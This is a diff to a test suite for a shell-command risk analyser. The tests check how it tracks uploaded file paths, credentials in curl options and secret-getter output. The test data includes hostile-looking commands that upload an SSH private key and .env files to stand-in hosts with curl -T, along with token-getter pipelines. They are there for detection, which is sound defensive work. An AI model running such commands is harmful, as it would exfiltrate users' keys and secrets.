@@ -888,8 +888,8 @@ describe("shellRisk", () => {
       expect(net(line), line).toEqual([]);
   });
 
-  it("paths resolve against cwd and a cd in the line is not followed", () => {
-    expect(one("cd sub && curl -T a https://h.example.com").sends).toEqual(["/w/a"]);
+  it("paths resolve against cwd, and a cd in the line moves the base (fix round 2 item 5)", () => {
+    expect(one("cd sub && curl -T a https://h.example.com").sends).toEqual(["/w/sub/a"]);
     expect(one("curl -T a https://h.example.com", null).sends).toEqual(["a"]);
     expect(one("curl -T ~/x https://h.example.com").sends).toEqual(["~/x"]);
     expect(one("curl -T ../up/x https://h.example.com").sends).toEqual(["/up/x"]);
@@ -1384,5 +1384,38 @@ describe("names by their words everywhere (fix round 2 item 4)", () => {
       ).toEqual([V]);
     for (const option of ["--monkey-wrench", "--sort-key", "--zip-code"])
       expect(spans(`curl ${option} ${V} https://a.example.com`), option).toEqual([]);
+  });
+});
+
+// Fix round 2 item 5: a user before an empty password (M1), a getter whose
+// output passes only through head, tail, tr or cut (M8), and a cd that moves
+// the base of the line's later commands.
+describe("the smaller rules of fix round 2 item 5", () => {
+  const TOK = ["sk", "_test_", "Zk9wQ4tLm2xRt7"].join("");
+  it("a user option before an empty password counts the user (M1)", () => {
+    const line = `curl -u ${TOK}: https://a.example.com`;
+    const risk = shellRisk(line, W);
+    expect(risk.values.map((v) => [line.slice(v.start, v.end), v.secret, v.named])).toEqual([
+      [`${TOK}:`, TOK, true],
+    ]);
+    expect(risk.placeholders).toBe(0);
+  });
+
+  it("a getter's output that passes only through head, tail, tr or cut is still its own (M8)", () => {
+    for (const line of [
+      "pass show db/prod | head -1",
+      "gh auth token | tr -d '\\n'",
+      "gh auth token | cut -c1-40 | tail -1",
+    ])
+      expect(shellRisk(line, W).secretOutput, line).toBe(true);
+    for (const line of ["gh auth token | pbcopy", "pass show db/prod | head -1 | pbcopy"])
+      expect(shellRisk(line, W).secretOutput, line).toBe(false);
+  });
+
+  it("a cd moves the base of the later commands of the line", () => {
+    expect(net("cd ~/.ssh && curl -T id_rsa https://up.example.com/")[0].sends).toEqual(["~/.ssh/id_rsa"]);
+    expect(net("cd /w/app; curl -T .env https://up.example.com/")[0].sends).toEqual(["/w/app/.env"]);
+    // A subshell's cd ends with it.
+    expect(net("(cd /w/app) && curl -T .env https://up.example.com/")[0].sends).toEqual(["/w/.env"]);
   });
 });
